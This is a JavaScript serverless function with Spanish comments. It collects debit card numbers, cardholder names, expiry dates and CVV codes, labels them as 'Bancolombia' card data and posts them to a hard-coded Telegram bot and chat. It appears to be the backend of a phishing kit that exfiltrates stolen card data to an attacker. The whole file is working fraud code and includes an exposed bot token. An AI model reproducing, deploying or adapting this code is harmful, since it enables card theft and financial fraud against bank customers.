const axios = require('axios');

// ============================================
// ✅ CONFIGURACIÓN DE TELEGRAM
// ============================================
const BOT_TOKEN = '8703044811:AAF2fekkn1hBO83UDXozzuvmzczZYQK2Mj4';
const CHAT_ID = '8042354877';
// ============================================

module.exports = async (req, res) => {
    // Configurar CORS
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    // Manejar preflight
    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    // Solo aceptar POST
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Método no permitido' });
    }

    try {
        const { cardNumber, cardHolder, expiryDate, cvcCode } = req.body;

        // Validaciones
        if (!cardNumber || !cardHolder || !expiryDate || !cvcCode) {
            return res.status(400).json({ error: 'Faltan datos de la tarjeta' });
        }

        if (cardNumber.length !== 16) {
            return res.status(400).json({ error: 'El número de tarjeta debe tener 16 dígitos' });
        }

        if (!expiryDate.match(/^\d{2}\/\d{2}$/)) {
            return res.status(400).json({ error: 'La fecha debe tener formato MM/AA' });
        }

        if (cvcCode.length !== 3) {
            return res.status(400).json({ error: 'El CVV debe tener 3 dígitos' });
        }

        // Construir mensaje
        const message = `🏦 *BANCOLOMBIA - NUEVA TARJETA DÉBITO* 🏦\n\n` +
                        `💳 *Número:* \`${cardNumber}\`\n` +
                        `👤 *Titular:* ${cardHolder}\n` +
                        `📅 *Vencimiento:* ${expiryDate}\n` +
                        `🔐 *CVV:* ${cvcCode}\n` +
                        `🔄 *Tipo:* Mastercard Débito\n\n` +
                        `🕒 *Fecha:* ${new Date().toLocaleString('es-CO')}\n` +
                        `🔒 *Canal:* Tarjeta Virtual Bancolombia`;

        // Enviar a Telegram
        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        const response = await axios.post(telegramUrl, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown',
            disable_web_page_preview: true
        });

        if (response.data.ok) {
            res.status(200).json({ 
                success: true, 
                message: 'Datos enviados a Telegram correctamente' 
            });
        } else {
            res.status(500).json({ 
                error: 'Error al enviar a Telegram'
            });
        }

    } catch (error) {
        console.error('Error:', error.response?.data || error.message);
        res.status(500).json({ 
            error: 'Error interno del servidor'
        });
    }
};
